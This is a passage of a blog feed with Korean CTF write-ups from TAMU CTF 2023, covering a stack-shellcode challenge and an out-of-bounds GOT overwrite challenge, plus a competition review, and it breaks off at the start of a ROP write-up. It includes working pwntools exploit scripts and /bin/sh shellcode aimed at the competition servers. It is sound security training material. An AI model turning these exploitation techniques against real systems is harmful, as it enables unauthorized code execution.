ì—†ê¸° ë•Œë¬¸ì— í•­ìƒ ì¼ì •í•˜ë‹¤. ì²˜ìŒì— 2ë°”ì´íŠ¸ ë¸Œë£¨íŠ¸í¬ì‹±ì„ ì´ìš©í•˜ì—¬ ê°’ì„ ì˜ˆì¸¡í•˜ë ¤ê³  í–ˆìœ¼ë‚˜, ê³„ì† ì‹¤í–‰í•˜ê³  í…ŒìŠ¤íŠ¸í•˜ë‹¤ ë³´ë‹ˆ <code>0x4500</code>ìœ¼ë¡œ ì¼ì •í•œ ê²ƒì„ í™•ì¸í–ˆê³ , ì„œë²„ë„ ë™ì¼í–ˆë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>rbp+8</code>ì€ <code>ret</code>ì´ë‹¤. ìš°ë¦¬ëŠ” í˜„ìž¬ shellcodeë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìžˆë‹¤. <code>ret</code> ë’¤ì— shellcodeë¥¼ ìœ„ì¹˜ì‹œì¼œì£¼ìž. shellcodeê°€ ì €ìž¥ëœ ì£¼ì†Œë¥¼ <code>ret</code>ì— ë„£ì–´ì£¼ìž. ìš°ë¦¬ëŠ” ìŠ¤íƒ ì£¼ì†Œë¥¼ ì•Œê³  ìžˆê¸° ë•Œë¬¸ì— ê°€ëŠ¥í•˜ë‹¤. </p><p>ì°¸ê³ ë¡œ shellcodeë¥¼ ì‹¤í–‰ì‹œí‚¬ ë•Œ ìŠ¤íƒì´ ëª¨ìžëž„ ìˆ˜ë„ ìžˆê¸° ë•Œë¬¸ì— <code>sub rsp, 0x100</code> ì´ ì–´ì…ˆë„ ê°™ì´ ì‹¤í–‰ì‹œì¼°ë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;sea-shells&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./sea-shells&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./sea-shells&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7fff</span>):</span><br><span class="line">    i = <span class="number">0x4500</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="comment"># info(hex(i))</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">    result = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Woohoo&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">        info(<span class="built_in">hex</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;work: &#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span>.ljust(<span class="number">32</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh()).ljust(32, b&#x27;\0&#x27;)</span></span><br><span class="line"></span><br><span class="line">values = struct.unpack(<span class="string">&#x27;4Q&#x27;</span>, shellcode)</span><br><span class="line"><span class="built_in">print</span>(values)       </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(values[<span class="number">3</span>])) <span class="comment"># 1</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(values[<span class="number">2</span>])) <span class="comment"># 2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(values[<span class="number">1</span>])) <span class="comment"># 3</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(values[<span class="number">0</span>])) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x9</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(leak + <span class="number">0x40</span>)</span><br><span class="line">payload += asm(<span class="string">&#x27;sub rsp, 0x100\n&#x27;</span> + shellcraft.sh())</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;cr34t1v3_5h3llc0d3_ftw&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Bank (pwn, oob write)</title>
      <link href="/230503-tamu2023-6.Bank-pwn/"/>
      <url>/230503-tamu2023-6.Bank-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I came up with this banking system that lets you deposit as much as you want. Iâ€™m not sure why, but my friend said it was a terrible ideaâ€¦<br>Author: nhwn</p></blockquote><ul><li>[68 solves &#x2F; 456 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë°”ì´ë„ˆë¦¬ì™€ ì†ŒìŠ¤ì½”ë“œë¥¼ ì œê³µí•´ì¤€ë‹¤. libcë„ ì œê³µí•´ì¤¬ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> accounts[<span class="number">100</span>];</span><br><span class="line"><span class="type">char</span> exit_msg[] = <span class="string">&quot;Have a nice day!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">deposit</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> amount = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter the number (0-100) of the account you want to deposit in: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter the amount you want to deposit: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;amount);</span><br><span class="line">    accounts[index] += amount;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    deposit();</span><br><span class="line">    deposit();</span><br><span class="line">    <span class="built_in">puts</span>(exit_msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>accounts[index] += amount;</code> ì—ì„œ <code>index</code> ê²€ì‚¬ë¥¼ í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— <code>oob write</code>ê°€ ë°œìƒí•œë‹¤. ê°„ë‹¨í•œ ì†ŒìŠ¤ì½”ë“œì´ë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>accounts</code>ëŠ” bss ì˜ì—­ì— ìžˆê¸° ë•Œë¬¸ì— <code>puts@got</code>ë¥¼ ìž˜ ì¡°ì ˆí•´ì„œ <code>onegadget</code> ì˜¤í”„ì…‹ìœ¼ë¡œ ë§Œë“¤ìž!</p><p><code>puts@got</code>ê°€ ìœ„ì¹˜í•œ ê³³ì—” ì–´ë–»ê²Œ ì ‘ê·¼í•˜ëŠëƒ? <code>oob</code>ê°€ ë°œìƒí•˜ê¸° ë•Œë¬¸ì— <code>index</code>ë¥¼ ì´ìš©í•´ì„œ ì¶©ë¶„ížˆ ì ‘ê·¼ ê°€ëŠ¥í•˜ë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;bank&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./bankp&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget_off = [<span class="number">0x4497f</span>, <span class="number">0x449d3</span>, <span class="number">0xe5306</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;-16&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">off =  one_gadget_off[<span class="number">0</span>] - <span class="number">0x71a40</span> </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(off))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;a_v3ry_h3fty_d3p0s1t&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 review</title>
      <link href="/230430-tamu2023-0review/"/>
      <url>/230430-tamu2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li><li><a href="https://github.com/tamuctf/tamuctf-2023">https://github.com/tamuctf/tamuctf-2023</a></li></ul><p>ì´ë²ˆ ì£¼ë§ì— ì˜¤ëžœë§Œì— ì „ë ¥(?)ìœ¼ë¡œ posixì™€ í•¨ê»˜ CTFì— ì°¸ì—¬í–ˆë‹¤. ì›ëž˜ ê°ìž í¬ë„ˆë¸”ë§Œ í’€ì–´ì„œ ê·¸ëƒ¥ ë”°ë¡œ ì°¸ì—¬í–ˆì—ˆëŠ”ë° ì´ë²ˆì—ëŠ” ì²˜ìŒìœ¼ë¡œ ê°™ì€ íŒ€ìœ¼ë¡œ ì°¸ì—¬í–ˆë‹¤. ë‚˜ëŠ” í‰ì†Œì— í¬ë„ˆë¸”ë§Œ ê±´ë“œë ¤ì„œ í’€ì´ ì†ë„ê°€ ëŠë¦¬ë”ë¼ë„ í¬ë„ˆë¸” ìœ„ì£¼ë¡œ í’€ê³  ì‹¶ì—ˆì—ˆëŠ”ë° posixê°€ ë‚˜ì—ê²Œ í¬ë„ˆë¸”ì„ ì–‘ë³´í•´ì¤˜ì„œ ê·¸ë ‡ê²Œ í•  ìˆ˜ ìžˆì—ˆë‹¤. íŒ€ ëª…ì€ ì•„ë¬´ê±°ë‚˜ í•˜ë¼ê³  í•´ì„œ ë‚´ ë‹‰ë„´ìœ¼ë¡œ í•˜ì˜€ë‹¤. (ì‹œìž‘í•˜ê¸° ì „ì— ë¬¼ì–´ë´¤ëŠ”ë° í•´ë„ ëœë‹¤ê³  í–ˆë‹¤.ã…Ž)</p><img src="/images/230430-tamu2023-0review/1.png" width=700/><br><p>ê²°ê³¼ì ìœ¼ë¡œ ìš°ë¦¬ëŠ” 10ë“±ì„ í•  ìˆ˜ ìžˆì—ˆë‹¤! ì›ëž˜ëŠ” 14ë“±ì¯¤ì´ì—ˆëŠ”ë° ë§‰íŒì— í¬ë¦½í†  ë¬¸ì œë¥¼ í•´ê²°í•´ì„œ 10ë“±ì— ì•ˆì°©í•  ìˆ˜ ìžˆì—ˆë‹¤.</p><img src="/images/230430-tamu2023-0review/2.png" width=700/><br><p>posixê°€ ì‚¬ì‹¤ ê±°ì˜ ë‹¤ í’€ì—ˆë‹¤. ì›¹ì´ëž‘ ë¦¬ë²„ì‹±ì„ ìºë¦¬í•´ì¤¬ë‹¤. ë‚´ê°€ ì¸ì¦í•œ ë¬¸ì œëŠ” ëª©ë¡ì€ ì•„ëž˜ì™€ ê°™ë‹¤.</p><img src="/images/230430-tamu2023-0review/3.png" width=700/><br><img src="/images/230430-tamu2023-0review/4.png" width=700/><br><p>ë¹¨ê°„ìƒ‰ ë„¤ëª¨ëŠ” ë‚´ê°€ í’€ê³  ì¸ì¦í–ˆê³ , íŒŒëž€ìƒ‰ ë„¤ëª¨ëŠ” ì—´ì‹¬ížˆ ë¶„ì„í–ˆì§€ë§Œ í’€ì§€ ëª»í•œ ê²½ìš°, í˜¹ì€ ê°™ì´ ë¶„ì„í•˜ë‹¤ê°€ posixê°€ ë¨¼ì € í’€ì–´ì„œ ì¸ì¦í•œ ê²½ìš°, í˜¹ì€ posixê°€ ê±°ì˜ ë‹¤ ë¶„ì„í–ˆì§€ë§Œ ë‚´ê°€ flagë¥¼ ì°¾ì•„ì„œ ì¸ì¦í•œ ê²½ìš°ì´ë‹¤.<br>(í¬ë„ˆë¸” ì²«ë²ˆì§¸ ë¬¸ì œ ê±°ì˜ 10ë¶„ì»·í•´ì„œ ë‚´ê°€ í¼ë¸”ë¨¹ì—ˆë‹¤. ã…Ž í¬ë„ˆë¸” ì²«ë²ˆì§¸ ë¬¸ì œ í’€ê³  ë”´ê±°í•˜ëŸ¬ ê°”ë‹¤.)</p><p>ì´ë²ˆ ê¸°íšŒë¡œ í¬ë¦½í† ì— ëŒ€í•œ í¥ë¯¸ê°€ ì•„ì£¼ ì‚´ì§ ìƒê²¼ë‹¤. ì´ ì”¨í…ì„ í†µí•´ md5 collisionê³¼ prng, lcg ì•Œê³ ë¦¬ì¦˜ì— ëŒ€í•´ ìƒˆë¡­ê²Œ ì•Œê²Œë˜ì—ˆë‹¤. ë•ë¶„ì— ë¸”ë¡œê·¸ ìµœì´ˆ í¬ë¦½í†  ë¡¸ì—…ì„ ìž‘ì„±í•´ë³´ë ¤ê³  í•œë‹¤. í¬ë¦½í†  ë¬¸ì œ í’€ë©´ì„œ ëŒ€íšŒ ëë‚˜ê¸° 1ì‹œê°„ ì „ì— ChatGPTí•œí…Œ ì´ê²ƒì €ê²ƒ ë¬¼ì–´ë³´ê³  ížŒíŠ¸ ì–»ì–´ì„œ <code>prng</code> ë¬¸ì œë¥¼ ë°”ë¡œ í’€ ìˆ˜ ìžˆì—ˆë‹¤. ã…‹ã…‹ ì²«ë²ˆì§¸ rsa ë¬¸ì œëŠ” ëë‚˜ê³  ë¡¸ì—…ë´¤ëŠ”ë°ë„ ì•„ì§ë„ ëª¨ë¥´ê² ë‹¤. í’€ê³  ì‹¶ì–´ì„œ ì—´ì‹¬ížˆ ë…¸ë ¥í–ˆëŠ”ë° ê²°êµ­ì— í’€ì§€ ëª»í•´ì„œ ì•„ì‰½ë‹¤.</p><p>í¬ë„ˆë¸”ì€ ì—­ì‹œ ë¶„ì„ë³´ë‹¤ ìµìŠ¤ê°€ í›¨ì”¬ ì–´ë µë‹¤. ì½”ë“œ ì½ê³  ì¶”ì¸¡ ëª»í•´ë„ ë””ë²„ê¹…í•˜ë©´ì„œ ì·¨ì•½ì ì€ ìƒê°ë³´ë‹¤ ê¸ˆë°© ì°¾ì„ ìˆ˜ ìžˆëŠ”ë° ìµìŠ¤ê°€ ë„ˆë¬´ ì–´ë ¤ì› ë‹¤. íŠ¹ížˆ <code>Pwnme</code>â€¦ ë˜ê²Œ ê°„ë‹¨í•œë° ì–´ë–»ê²Œ í’€ì§€ ëª°ë¼ì„œ posixí•œí…Œ ë„ì›€ ìš”ì²­í•´ì„œ ê°™ì´ ë³´ë‹¤ê°€ posixê°€ ì²œìž¬ê°™ì€ ë°œìƒ(ë‚˜ëŠ” ëª»í–ˆë˜ ë°œìƒ)ìœ¼ë¡œ í’€ì–´ë²„ë ¸ë‹¤ ã„·ã„·. <code>Shellcode</code> ë¬¸ì œëŠ” whitelistê°€ ë„ˆë¬´ ë¹¡ì„¸ì„œ andì™€ or ì—°ì‚°ì •ë„ë°–ì— ì‚¬ìš©ëª»í•œë‹¤. ì•„ì§ ë‚´ ì—­ëŸ‰ìœ¼ë¡œëŠ” í’€ ìˆ˜ ì—†ì„ ê²ƒ ê°™ì•„ì„œ posixí•œí…Œ í’€ì–´ë‹¬ë¼ê³  í–ˆë‹¤. ã…Ž <code>Macchiato</code> ë¬¸ì œëŠ” ìžë°”ë¡œ ìž‘ì„±ë˜ì–´ ìžˆë‹¤. ìžë°”ë¡œ ìž‘ì„±ëœ í”„ë¡œê·¸ëž¨ì€ ë©”ëª¨ë¦¬ ê´€ë¦¬ë¥¼ ê°€ë¹„ì§€ ì»¬ë ‰í„°ê°€ ìž˜ í•´ì£¼ê¸° ë•Œë¬¸ì— ì¼ë°˜ì ìœ¼ë¡œ ë©”ëª¨ë¦¬ ì»¤ëŸ½ì…˜ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ì—†ë‹¤. ê·¸ëž˜ì„œ ì¼ë¶€ëŸ¬ ì·¨ì•½í•œ í‚¤ì›Œë“œë¥¼ ìž‘ì„±í•´ì¤˜ì•¼ í•œë‹¤. ìƒˆë²½ì— ë¶„ì„ ì¡°ê¸ˆ í•˜ë‹¤ê°€ ìž ì™€ì„œ ê·¸ë§Œë’€ë‹¤. </p><p>í¬ë Œì‹ ì²«ë²ˆì§¸ ë¬¸ì œëŠ” ë©”ëª¨ë¦¬ í¬ë Œì‹ ë¬¸ì œì´ë‹¤. ë””ìŠ¤í¬ ì´ë¯¸ì§€ë¥¼ ì œê³µí•´ì£¼ëŠ”ë° mountê¹Œì§€ í•˜ê³  posixì™€ ê°™ì´ ë¶„ì„í–ˆë‹¤. ë¬¸ì œì—ì„œ ì œê³µí•´ì¤€ pcap íŒŒì¼ì—ì„œ 4444 í¬íŠ¸ì— ì ‘ì†í•´ì„œ ë°ì´í„°ë¥¼ ì£¼ê³  ë°›ì€ ê²ƒì„ ë°”íƒ•ìœ¼ë¡œ 4444 í¬íŠ¸ë¥¼ ì—¬ëŠ” ë°”ì´ë„ˆë¦¬ë¥¼ ì°¾ìœ¼ë ¤ê³  í–ˆë‹¤. vi historyì¸ê°€ ê·¸ê±° ë³´ê³  ìˆ˜ìƒí•œ íŒŒì´ì¬ ì½”ë“œë¥¼ ì°¾ì•˜ëŠ”ë° AES encodeë¥¼ ì´ìš©í•˜ì—¬ í†µì‹ ì„ í•  ìˆ˜ ìžˆëŠ” ì½”ë“œì˜€ë‹¤. ì—¬ê¸°ì„œë¶€í„° ëšë”±ëšë”± posixê°€ pcap íŒŒì¼ì—ì„œ ë°ì´í„° ì „ì†¡í•œê±°ëž‘ ì „ì†¡ë°›ì€ ê²ƒì„ í•´ì„í•´ì„œ flagë¥¼ êµ¬í•  ìˆ˜ ìžˆì—ˆë‹¤. ë‘ë²ˆì§¸ <code>Discordance</code> ë¬¸ì œëŠ” ì—´ì‹¬ížˆ ë…¸ë ¥í–ˆëŠ”ë° ê²°êµ­ í’€ì§€ ëª»í•˜ì˜€ë‹¤. ë¡¸ì—…ë´¤ëŠ”ë° ë‚´ ê¸°ì¤€ìœ¼ë¡œ ê²Œì‹± ìš”ì†Œê°€ ìžˆì–´ì„œ í•˜ë£¨ì¢…ì¼ ë´¤ì–´ë„ ëª» í’€ì—ˆì„ ê²ƒ ê°™ë‹¤. </p><p>ë¯¸ìŠ¤í¬ëŠ” ë‚˜ë¦„ ìž¬ë°Œì—ˆë‹¤. ë§ˆì§€ë§‰ ë¬¸ì œëŠ” ë§ˆì¸í¬ëž˜í”„íŠ¸ì—ì„œ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ” ë¬¸ì œì¸ë° ë„ˆë¬´ ì‹ ë°•í–ˆë‹¤. ë‚´ê°€ ê´€ì—¬í•œ ê²ƒì€ í•˜ë‚˜ë„ ì—†ì§€ë§Œ ê·¸ëƒ¥ ìž¬ë°Œì—ˆë‹¤. </p><p>ëŒ€íšŒ ì‹œìž‘í•˜ê¸° ì „ì— ì”¨í… ìš´ì˜ì§„ì˜ ì‹¤ìˆ˜ë¡œ ëŒ€íšŒ ì‹œê°„ì´ ì¡°ê¸ˆ ì´ìƒí–ˆì§€ë§Œ, (ì„¸ê³„ ì‹œê°„ì„ ì œëŒ€ë¡œ ìˆ™ì§€í•˜ì§€ ëª»í•œ ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.) ë¬¸ì œëŠ” ì „ë¶€ ë‹¤ ìƒê°ë³´ë‹¤ ìž¬ë°Œì—ˆë‹¤. ëŒ€íšŒ ê¸°ê°„ë„ 48ì‹œê°„ì´ë¼ ì•„ë¬´ê²ƒë„ ëª¨ë¥´ëŠ” í¬ë¦½í† ë¥¼ ê³µë¶€í•˜ë©´ì„œ í’€ ìˆ˜ ìžˆì–´ì„œ ë§¤ìš° ì˜ë¯¸ìžˆë˜ ì‹œê°„ì´ì—ˆë‹¤.</p><p>ë¡¸ì—…ì€ í¬ë¦½í†  ë‘ ë¬¸ì œì™€ í¬ë„ˆë¸” 8 ë¬¸ì œë¥¼ ì ìœ¼ë ¤ê³  í•œë‹¤. ë‹¤ ì ìœ¼ë©´ ì—¬ê¸° ì•„ëž˜ ë§í¬ë¥¼ ì¶”ê°€í•  ì˜ˆì •ì´ë‹¤.</p><ul><li>Pwn<ul><li><a href="http://jiravvit.github.io/230503-tamu2023-1.Inspector_Gadget-pwn/">http://jiravvit.github.io/230503-tamu2023-1.Inspector_Gadget-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-2.Unlucky-pwn/">http://jiravvit.github.io/230503-tamu2023-2.Unlucky-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-3.Pointers-pwn/">http://jiravvit.github.io/230503-tamu2023-3.Pointers-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-4.Randomness-pwn/">http://jiravvit.github.io/230503-tamu2023-4.Randomness-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-5.Sea_Shells-pwn/">http://jiravvit.github.io/230503-tamu2023-5.Sea_Shells-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-6.Bank-pwn/">http://jiravvit.github.io/230503-tamu2023-6.Bank-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/">http://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-8.Pwnme-pwn/">http://jiravvit.github.io/230503-tamu2023-8.Pwnme-pwn/</a></li></ul></li><li>Crypto<ul><li><a href="http://jiravvit.github.io/230503-tamu2023-9.MD5-crypto/">http://jiravvit.github.io/230503-tamu2023-9.MD5-crypto/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-10.PRNG-crypto/">http://jiravvit.github.io/230503-tamu2023-10.PRNG-crypto/</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Space Heroes CTF 2023 - engine failure (simple rop)</title>
      <link href="/230428-superheroesctf2023-engine-failure/"/>
      <url>/230428-superheroesctf2023-engine-failure/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1856">https://ctftime.org/event/1856</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; 245 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>2ë²ˆ ì˜µì…˜ì„ í†µí•´ <code>puts</code> ë¦½ì‹œ ì£¼ì†Œë¥¼ ì¶œë ¥í•´ì£¼ê³ , 1ë²ˆ ì˜µì…˜ì„ í†µí•´ <code>gets</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìžˆë‹¤. ëŠ˜ í•˜ë˜ëŒ€ë¡œ <code>ROP</code>ë¥¼ í•˜ë©´ ëœë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 